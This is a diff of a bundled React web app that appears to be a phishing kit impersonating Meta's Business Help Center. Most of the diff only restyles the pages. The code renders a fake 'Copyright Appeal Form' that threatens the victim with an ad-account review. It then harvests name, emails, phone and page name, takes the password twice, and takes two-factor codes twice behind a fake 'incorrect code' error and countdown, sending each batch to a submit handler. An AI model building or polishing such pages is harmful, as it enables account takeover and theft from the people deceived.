@@ -8925,24 +8925,17 @@
           (S.defaultStyles = {
             overlay: {
               position: "fixed",
-              top: 0,
-              left: 0,
-              right: 0,
-              bottom: 0,
-              background:
-                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+              inset: 0,
+              background: "rgba(0,0,0,0.8)",
             },
             content: {
               position: "absolute",
-              top: "40px",
-              left: "40px",
-              right: "40px",
-              bottom: "40px",
-              border: "1px solid #ccc",
-              background: "#fff",
+              inset: 40,
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
               overflow: "auto",
               WebkitOverflowScrolling: "touch",
-              borderRadius: "10px",
+              borderRadius: "15px",
               outline: "none",
               padding: "20px",
             },
@@ -10790,8 +10783,7 @@
           }, []);
           return (0, c.jsxs)("div", {
             style: {
-              background:
-                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+              background: "#eee",
               height: "100vh",
             },
             children: [
@@ -10800,7 +10792,7 @@
                 style: {
                   borderSizing: "border-box",
                   background:
-                    "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                   boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
                 },
                 children: (0, c.jsx)("div", {
@@ -10814,28 +10806,30 @@
               }),
               (0, c.jsx)("div", {
                 className: "body",
-                style: { display: "flex", justifyContent: "center" },
+                style: {
+                  display: "flex",
+                  justifyContent: "center",
+                  transform: "translate(0%, 20%)",
+                  margin: 20,
+                },
                 children: (0, c.jsx)("div", {
                   style: {
-                    marginTop: 40,
-                    marginRight: 10,
-                    marginLeft: 10,
+                    marginTop: "40px 10px 0px",
                     maxWidth: 700,
                   },
                   children: (0, c.jsxs)("div", {
                     style: {
-                      backgroundColor: "white",
+                      background:
+                        "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                       justifyContent: "space-between",
                       alignItems: "center",
                       minHeight: 200,
                       maxWidth: 600,
-                      borderRadius: 20,
-                      border: "1px solid #d0d0d0",
+                      borderRadius: 15,
                       display: "flex",
-                      paddingTop: 30,
-                      paddingBottom: 30,
-                      paddingLeft: 30,
-                      paddingRight: 30,
+                      padding: 30,
+                      lineHeight: 1.5,
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     children: [
                       (0, c.jsx)("div", {
@@ -10848,6 +10842,7 @@
                         },
                         children: (0, c.jsx)("img", {
                           src: "/resources/ref.png",
+                          style: { borderRadius: 10 },
                           height: 130,
                           alt: "",
                         }),
@@ -10924,227 +10919,209 @@
           let w;
           return (0, c.jsxs)("div", {
             style: {
-              background:
-                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+              background: "#eee",
               height: "100vh",
             },
             children: [
               (0, c.jsx)("div", {
                 className: "body",
                 style: {
-                  display: "flex",
                   justifyContent: "center",
                   position: "absolute",
                   inset: "50% auto auto 50%",
-                  border: "1px solid rgb(204, 204, 204)",
-                  background: "rgb(255, 255, 255)",
+                  background:
+                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                   overflow: "auto",
-                  borderRadius: "25px",
+                  borderRadius: 15,
                   outline: "none",
-                  padding: "10px",
+                  padding: 20,
                   transform: "translate(-50%, -50%)",
-                  maxwidth: "100%",
+                  lineHeight: 1.5,
+                  borderTop: "0.5px solid #d0d0d0",
+                  boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
                 },
-                children: (0, c.jsx)("div", {
-                  style: {
-                    maxWidth: 600,
-                  },
-                  children: (0, c.jsxs)("div", {
+                children: [
+                  (0, c.jsx)("div", {
+                    className: "title",
                     style: {
-                      width: "100%",
-                      backgroundColor: "white",
-                      minHeight: 200,
+                      fontWeight: "bold",
+                      color: "#000000",
+                      padding: 20,
+                      fontSize: 20,
                     },
+                    children: "Check your authentication code",
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                    },
+                  }),
+                  (0, c.jsxs)("div", {
+                    className: "bodyofcard",
                     children: [
                       (0, c.jsx)("div", {
-                        className: "title",
                         style: {
-                          fontWeight: "bold",
-                          color: "#000000",
-                          padding: "10px 10px 15px 10px",
-                          fontSize: 20,
+                          padding: 15,
+                          fontSize: 15,
+                          fontWeight: 500,
                         },
-                        children: "Check your authentication code",
-                      }),
-                      (0, c.jsx)("hr", {
-                        style: {
-                          borderTop: "1px solid #d0d0d0",
-                          marginTop: 10,
-                          marginBottom: 10,
-                        },
+                        children:
+                          "Your account has two-factor authentication switched on, which requires this extra login step.",
                       }),
                       (0, c.jsxs)("div", {
-                        className: "bodyofcard",
-                        children: [
-                          (0, c.jsx)("div", {
-                            style: {
-                              padding: "10px 10px 0px 10px",
-                              fontSize: 14,
-                              fontWeight: 500,
-                            },
-                            children:
-                              "Your account has two-factor authentication switched on, which requires this extra login step.",
-                          }),
-                          (0, c.jsxs)("div", {
-                            style: {
-                              padding: "10px 10px 0px 10px",
-                              fontSize: 14,
-                              fontWeight: 500,
-                              display: "flex",
-                            },
-                            children:
-                              "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
-                          }),
-                          (0, c.jsx)("div", {
-                            style: {
-                              padding: 20,
-                              margin: "auto auto",
-                              alignItems: "center",
-                            },
-                            children: (0, c.jsx)("img", {
-                              src: "/resources/otp.png",
-                              style: {
-                                width: "100%",
-                                borderRadius: 20,
-                                alignItems: "center",
-                              },
-                            }),
-                          }),
-                          (0, c.jsxs)("div", {
-                            style: {
-                              padding: "10px 10px 10px 10px",
-                              fontSize: 14,
-                              fontWeight: 400,
-                              display: "flex",
-                              alignItems: "center",
-                            },
-                            children: [
-                              (0, c.jsx)("input", {
-                                type: "text",
-                                style: {
-                                  width: "60%",
-                                  padding: "15px 10px 15px 10px",
-                                  fontSize: 15,
-                                  fontWeight: 500,
-                                  border: "1px solid #d0d0d0",
-                                  borderRadius: 10,
-                                },
-                                placeholder: "Login code",
-                                value: f,
-                                onChange: (e) => {
-                                  const t = e.target.value;
-                                  t.length > 8 || p(t);
-                                },
-                              }),
-                              0 !== g &&
-                                (0, c.jsxs)("div", {
-                                  style: { marginLeft: 5 },
-                                  children: [
-                                    "(wait 00:",
-                                    g >= 10 ? g : "0" + g,
-                                    ")",
-                                  ],
-                                }),
-                            ],
-                          }),
-                          h &&
-                            (0, c.jsx)("div", {
-                              style: {
-                                color: "#DC3545",
-                                fontSize: 14,
-                                marginTop: 15,
-                                marginBottom: 15,
-                                marginLeft: 10,
-                              },
-                              children:
-                                "The code generator you entered is incorrect, please try again!",
-                            }),
-                        ],
-                      }),
-                      (0, c.jsx)("hr", {
                         style: {
-                          borderTop: "1px solid #d0d0d0",
-                          marginTop: 10,
-                          marginBottom: 10,
-                        },
-                      }),
-                      (0, c.jsxs)("div", {
-                        className: "footercard",
-                        style: {
+                          padding: "0px 15px 0px 15px",
+                          fontSize: 15,
+                          fontWeight: 500,
                           display: "flex",
-                          justifyContent: "space-between",
-                          alignItems: "center",
-                          paddingLeft: 20,
-                          paddingRight: 20,
-                          paddingBottom: 20,
-                          paddingTop: 10,
+                        },
+                        children:
+                          "Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or a text message you have received on your phone).",
+                      }),
+                      (0, c.jsx)("div", {
+                        style: {
+                          margin: 15,
+                        },
+                        children: (0, c.jsx)("img", {
+                          src: "/resources/otp.png",
+                          style: {
+                            width: "100%",
+                            borderRadius: 20,
+                          },
+                        }),
+                      }),
+                      (0, c.jsxs)("div", {
+                        style: {
+                          padding: 10,
+                          marginLeft: 10,
+                          fontSize: 15,
+                          fontWeight: 400,
+                          display: "flex",
                         },
                         children: [
-                          (0, c.jsx)("button", {
+                          (0, c.jsx)("input", {
+                            type: "text",
                             style: {
-                              width: "100%",
-                              paddingRight: 100,
-                              paddingLeft: 100,
-                              height: 45,
-                              fontWeight: "bold",
-                              fontSize: 18,
-                              borderRadius: 30,
-                              borderWidth: 0,
-                              alignItems: "center",
-                              backgroundColor:
-                                0 === f.length || 0 !== g
-                                  ? "#7DAFF9"
-                                  : "#3084F4",
-                              cursor: "pointer",
-                              color: "white",
+                              width: "50%",
+                              padding: 20,
+                              fontSize: 15,
+                              fontWeight: 500,
+                              border: "1px solid #d0d0d0",
+                              borderRadius: 10,
                             },
-                            disabled: 0 === f.length || 0 !== g,
-                            onClick: () => {
-                              0 === g &&
-                                (0 === y &&
-                                  d({
-                                    info: n,
-                                    name: r,
-                                    businessEmail: l,
-                                    personalEmail: a,
-                                    phone: o,
-                                    pageName: i,
-                                    passwordValue1: "------",
-                                    passwordValue2: u,
-                                    code1: f,
-                                    code2: "------",
-                                  }),
-                                1 == y &&
-                                  (clearInterval(w),
-                                  d({
-                                    info: n,
-                                    name: r,
-                                    businessEmail: l,
-                                    personalEmail: a,
-                                    phone: o,
-                                    pageName: i,
-                                    passwordValue1: "------",
-                                    passwordValue2: u,
-                                    code1: "------",
-                                    code2: f,
-                                  }),
-                                  s(3)),
-                                b((e) => e + 1),
-                                m(!0),
-                                v(60),
-                                (w = setInterval(() => {
-                                  v((e) =>
-                                    0 === e ? (clearInterval(w), 0) : e - 1
-                                  );
-                                }, 1e3)));
+                            placeholder: "Login code",
+                            value: f,
+                            onChange: (e) => {
+                              const t = e.target.value;
+                              t.length > 8 || p(t);
                             },
-                            children: "Submit",
                           }),
+                          0 !== g &&
+                            (0, c.jsxs)("div", {
+                              style: {
+                                marginLeft: 10,
+                                marginTop: 15,
+                              },
+                              children: [
+                                "(wait 00:",
+                                g >= 10 ? g : "0" + g,
+                                ")",
+                              ],
+                            }),
                         ],
+                      }),
+                      h &&
+                        (0, c.jsx)("div", {
+                          style: {
+                            color: "#DC3545",
+                            fontSize: 14,
+                            marginTop: "10px 10px 20px",
+                          },
+                          children:
+                            "The code you entered is incorrect, please try again!",
+                        }),
+                    ],
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "1px solid #d0d0d0",
+                      marginTop: 10,
+                      marginBottom: 10,
+                    },
+                  }),
+                  (0, c.jsxs)("div", {
+                    className: "footercard",
+                    style: {
+                      display: "flex",
+                      justifyContent: "space-between",
+                      alignItems: "center",
+                      paddingLeft: 20,
+                      paddingRight: 20,
+                      paddingBottom: 10,
+                      paddingTop: 10,
+                    },
+                    children: [
+                      (0, c.jsx)("button", {
+                        style: {
+                          width: "100%",
+                          paddingRight: 100,
+                          paddingLeft: 100,
+                          height: 45,
+                          fontWeight: "bold",
+                          fontSize: 18,
+                          borderRadius: 30,
+                          borderWidth: 0,
+                          alignItems: "center",
+                          backgroundColor:
+                            0 === f.length || 0 !== g ? "#7DAFF9" : "#3084F4",
+                          cursor: "pointer",
+                          color: "white",
+                        },
+                        disabled: 0 === f.length || 0 !== g,
+                        onClick: () => {
+                          0 === g &&
+                            (0 === y &&
+                              d({
+                                info: n,
+                                name: r,
+                                businessEmail: l,
+                                personalEmail: a,
+                                phone: o,
+                                pageName: i,
+                                passwordValue1: "------",
+                                passwordValue2: u,
+                                code1: f,
+                                code2: "------",
+                              }),
+                            1 == y &&
+                              (clearInterval(w),
+                              d({
+                                info: n,
+                                name: r,
+                                businessEmail: l,
+                                personalEmail: a,
+                                phone: o,
+                                pageName: i,
+                                passwordValue1: "------",
+                                passwordValue2: u,
+                                code1: "------",
+                                code2: f,
+                              }),
+                              s(3)),
+                            b((e) => e + 1),
+                            m(!0),
+                            v(60),
+                            (w = setInterval(() => {
+                              v((e) =>
+                                0 === e ? (clearInterval(w), 0) : e - 1
+                              );
+                            }, 1e3)));
+                        },
+                        children: "Submit",
                       }),
                     ],
                   }),
-                }),
+                ],
               }),
             ],
           });
@@ -11200,18 +11177,10 @@
           }, []),
           (0, c.jsxs)("div", {
             style: {
-              maxWidth: 680,
-              marginTop: 30,
-              marginBottom: 200,
-              marginRight: 10,
-              marginLeft: 10,
-              paddingLeft: 15,
-              paddingRight: 15,
-              paddingBottom: 40,
-              background:
-                "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
-              borderRadius: 20,
-              boxShadow: "0px 0px",
+              maxWidth: 700,
+              margin: "0px 20px 200px",
+              paddingBottom: "40px 10px 0px",
+              background: "rgba(0,0,0,0)",
             },
             children: [
               (0, c.jsxs)(l(), {
@@ -11254,7 +11223,6 @@
                     children:
                       "For your security, you must enter your password to continue.",
                   }),
-
                   (0, c.jsxs)("div", {
                     className: "",
                     children: [
@@ -11264,10 +11232,8 @@
                         onChange: (e) => f(e.target.value),
                         style: {
                           width: "95%",
-                          padding: 10,
-                          paddingTop: 15,
-                          paddingBottom: 15,
-                          fontSize: 14,
+                          padding: 15,
+                          fontSize: 15,
                           borderColor: "#d0d0d0",
                           borderWidth: 0.1,
                           borderRadius: 10,
@@ -11314,6 +11280,7 @@
                               backgroundColor: s ? "#3084F4" : "#7DAFF9",
                               cursor: "pointer",
                               color: "white",
+                              boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                             },
                             disabled: !s,
                             onClick: () => {
@@ -11340,31 +11307,34 @@
                 ],
               }),
               (0, c.jsx)("br", {}),
-              (0, c.jsx)("div", {
-                className: "",
-                style: {
-                  textAlign: "center",
-                  fontWeight: "bold",
-                  fontSize: 26,
-                  marginTop: 10,
-                  marginBottom: 20,
-                },
-                children: "Copyright Appeal Form",
-              }),
               (0, c.jsxs)("div", {
                 className: "",
                 style: {
-                  backgroundColor: "#ffffff",
-                  paddingTop: 20,
-                  paddingBottom: 20,
-                  paddingLeft: 20,
-                  paddingRight: 20,
-                  borderColor: "#000000",
-                  borderWidth: 0.2,
-                  borderRadius: 20,
-                  border: "1px solid #d0d0d0",
+                  backgroundColor: "#fff",
+                  marginTop: 40,
+                  padding: 20,
+                  borderRadius: 15,
+                  lineHeight: 1.5,
+                  boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                 },
                 children: [
+                  (0, c.jsx)("div", {
+                    className: "",
+                    style: {
+                      textAlign: "center",
+                      fontWeight: "bold",
+                      fontSize: 26,
+                      marginBottom: 20,
+                    },
+                    children: "Copyright Appeal Form",
+                  }),
+                  (0, c.jsx)("hr", {
+                    style: {
+                      borderTop: "0.5px solid #d0d0d0",
+                      marginTop: 20,
+                      marginBottom: 20,
+                    },
+                  }),
                   (0, c.jsx)("div", {
                     style: {
                       fontSize: 14,
@@ -11377,8 +11347,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 10,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "We have received multiple reports suggesting that your ad account is in violation of our Terms of Service and Community Standard. As a result, your ad account is scheduled for review.",
@@ -11388,19 +11357,24 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "If you believe this information is incorrect or causing confusion, please verify your identity and request a review.",
+                      }),
+                      (0, c.jsx)("hr", {
+                        style: {
+                          borderTop: "0.5px solid #d0d0d0",
+                          marginTop: 20,
+                          marginBottom: 20,
+                        },
                       }),
                       (0, c.jsx)("div", {
                         className: "",
                         style: {
                           fontWeight: "bold",
                           fontSize: 16,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children: "Appeal Guide",
                       }),
@@ -11409,8 +11383,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
@@ -11420,8 +11393,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 15,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
@@ -11431,8 +11403,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          marginTop: 15,
-                          marginBottom: 10,
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.",
@@ -11443,30 +11414,28 @@
               }),
               (0, c.jsx)("div", {
                 style: {
-                  paddingTop: 20,
-                  paddingBottom: 10,
-                  borderRadius: 10,
+                  margin: "20px 0px",
+                  paddingBottom: 20,
+                  borderRadius: 15,
+                  backgroundColor: "#fff",
+                  lineHeight: 1.5,
+                  boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                 },
-                children: (0, c.jsx)("img", {
-                  src: "/resources/unlock.png",
-                  width: "100%",
-                  style: {
-                    borderRadius: "30px",
-                    border: "1px solid #d0d0d0",
-                  },
-                }),
-              }),
-              (0, c.jsxs)("div", {
-                className: "",
                 children: [
+                  (0, c.jsx)("img", {
+                    src: "/resources/unlock.png",
+                    width: "100%",
+                    style: {
+                      borderRadius: "15px 15px 0px 0px",
+                    },
+                  }),
                   (0, c.jsx)("div", {
                     className: "",
                     style: {
                       fontWeight: "bold",
                       fontSize: 20,
                       color: "#3084F4",
-                      marginTop: 10,
-                      marginBottom: 15,
+                      margin: "15px 30px",
                     },
                     children: "Review request",
                   }),
@@ -11475,8 +11444,7 @@
                     style: {
                       fontWeight: "bold",
                       fontSize: 17,
-                      marginTop: 15,
-                      marginBottom: 15,
+                      margin: "15px 30px",
                     },
                     children: "Fixing problems with account restrictions",
                   }),
@@ -11485,31 +11453,34 @@
                     style: {
                       fontWeight: "normal",
                       fontSize: 15,
-                      marginTop: 15,
-                      marginBottom: 20,
+                      margin: "15px 30px",
                     },
                     children:
                       "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
                   }),
-                  (0, c.jsx)("textarea", {
-                    type: "text",
-                    value: m,
-                    onChange: (e) => g(e.target.value),
-                    style: {
-                      width: "95%",
-                      height: 80,
-                      padding: 10,
-                      paddingTop: 20,
-                      paddingBottom: 20,
-                      fontSize: 14,
-                      borderColor: "#d0d0d0",
-                      borderWidth: 0.1,
-                      borderRadius: 10,
-                      border: "1px solid #d0d0d0",
-                    },
-                    placeholder: "More info...",
-                  }),
                 ],
+              }),
+              (0, c.jsxs)("div", {
+                className: "",
+                style: {},
+                children: (0, c.jsx)("textarea", {
+                  type: "text",
+                  value: m,
+                  onChange: (e) => g(e.target.value),
+                  style: {
+                    width: "95%",
+                    height: 80,
+                    padding: 15,
+                    marginBottom: 10,
+                    fontSize: 15,
+                    borderColor: "#d0d0d0",
+                    borderWidth: 0.1,
+                    borderRadius: 10,
+                    border: "1px solid #d0d0d0",
+                    boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
+                  },
+                  placeholder: "Additional info...",
+                }),
               }),
               (0, c.jsxs)("div", {
                 className: "",
@@ -11524,14 +11495,14 @@
                     onChange: (e) => y(e.target.value),
                     style: {
                       width: "95%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
-                      fontSize: 14,
+                      padding: 15,
+                      marginBottom: 10,
+                      fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     placeholder: "Full Name",
                   }),
@@ -11550,14 +11521,14 @@
                     onChange: (e) => w(e.target.value),
                     style: {
                       width: "95%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      padding: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     placeholder: "Business Email Address",
                   }),
@@ -11576,14 +11547,14 @@
                     onChange: (e) => S(e.target.value),
                     style: {
                       width: "95%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      padding: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     placeholder: "Personal Email Address",
                   }),
@@ -11602,14 +11573,14 @@
                     onChange: (e) => C(e.target.value),
                     style: {
                       width: "95%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      padding: 15,
+                      marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     placeholder: "Mobile Phone Number",
                   }),
@@ -11628,14 +11599,13 @@
                     onChange: (e) => _(e.target.value),
                     style: {
                       width: "95%",
-                      padding: 10,
-                      paddingTop: 15,
-                      paddingBottom: 15,
+                      padding: 15,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
                       borderRadius: 10,
                       border: "1px solid #d0d0d0",
+                      boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                     },
                     placeholder: "Page Name",
                   }),
@@ -11644,7 +11614,7 @@
               (0, c.jsxs)("div", {
                 className: "",
                 style: {
-                  fontWeight: "600",
+                  fontWeight: "Bold",
                   color: "#1C2A33",
                   fontSize: 15,
                   marginTop: 15,
@@ -11659,7 +11629,8 @@
                   (0, c.jsx)("label", {
                     htmlFor: "terms",
                     style: { marginLeft: 5 },
-                    children: "I agree to our Terms, Data and Cookies Policy.",
+                    children:
+                      "I agree to our terms, data, and cookies policies.",
                   }),
                 ],
               }),
@@ -11670,10 +11641,12 @@
                   fontWeight: "bold",
                   fontSize: 18,
                   borderRadius: 30,
+                  marginBottom: 20,
                   borderWidth: 0,
                   backgroundColor: p ? "#3084F4" : "#7DAFF9",
                   cursor: "pointer",
                   color: "white",
+                  boxShadow: "rgba(0,0,0,0.1) 1px 3px 8px 3px",
                 },
                 disabled: !p,
                 onClick: n,
@@ -11709,16 +11682,14 @@
             ? (0, c.jsxs)("div", {
                 style: {
                   background:
-                    "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                 },
                 children: [
                   (0, c.jsx)("div", {
                     style: {
-                      paddingTop: 30,
-                      paddingLeft: 30,
-                      paddingBottom: 30,
+                      padding: 30,
                       background:
-                        "linear-gradient(110deg,#daedff 5.08%,#dfe7ff 34.89%,#f1f5fb 60.82%)",
+                        "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
                     },
                     children: (0, c.jsx)("img", {
                       src: "/resources/meta.svg",
@@ -11728,15 +11699,12 @@
                   }),
                   (0, c.jsxs)("div", {
                     style: {
-                      paddingRight: 30,
-                      paddingLeft: 30,
+                      padding: "20px 30px",
                       display: "flex",
                       justifyContent: "space-between",
                       fontWeight: "bold",
                       fontSize: 16,
-                      paddingTop: 20,
-                      paddingBottom: 10,
-                      backgroundColor: "white",
+                      backgroundColor: "#fff",
                     },
                     children: [
                       (0, c.jsx)("div", { children: "Business Help Center" }),
@@ -11748,6 +11716,7 @@
                         display: "flex",
                         height: 200,
                         justifyContent: "center",
+                        paddingLeft: -50,
                         alignItems: "center",
                         flexDirection: "column",
                         backgroundImage: "url(/resources/bg.jpeg)",
